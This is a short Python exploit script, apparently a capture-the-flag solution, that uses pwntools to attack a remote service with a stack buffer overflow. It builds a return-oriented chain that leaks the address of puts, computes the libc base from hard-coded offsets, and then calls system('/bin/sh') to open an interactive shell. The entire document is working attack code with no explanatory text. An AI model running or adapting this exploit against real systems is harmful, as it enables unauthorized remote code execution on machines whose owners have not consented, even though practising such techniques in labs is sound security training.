from pwn import *

proc = remote('0.0.0.0', 'insert port here')

puts_plt = 0x401030
puts_got = 0x404000
pop_rdi_ret = 0x4011f7
vuln = 0x4011fc

ret = 0x401016  

padding = b'a' * 64
ebp = b'c' * 8

payload = padding + ebp + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)

proc.clean()
proc.sendline(payload)

leaked_puts = proc.recvline().strip()
if len(leaked_puts) == 6 or len(leaked_puts) == 8:
    leaked_puts = u64(leaked_puts.ljust(8, b"\x00"))
else:
    log.error(f"Unexpected leak length: {leaked_puts}")

log.info(f"Leaked puts address: {hex(leaked_puts)}")

libc_puts_offset = 0x077980  # Adjust to match your libc
libc_system_offset = 0x04c490
libc_bin_sh_offset = 0x1b3e1a

libc_base = leaked_puts - libc_puts_offset
system = libc_base + libc_system_offset
bin_sh = libc_base + libc_bin_sh_offset

log.info(f"Calculated libc base address: {hex(libc_base)}")
log.info(f"Calculated system() address: {hex(system)}")
log.info(f"Calculated /bin/sh address: {hex(bin_sh)}")

payload = padding + ebp + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system)

proc.sendline(payload)
proc.interactive()
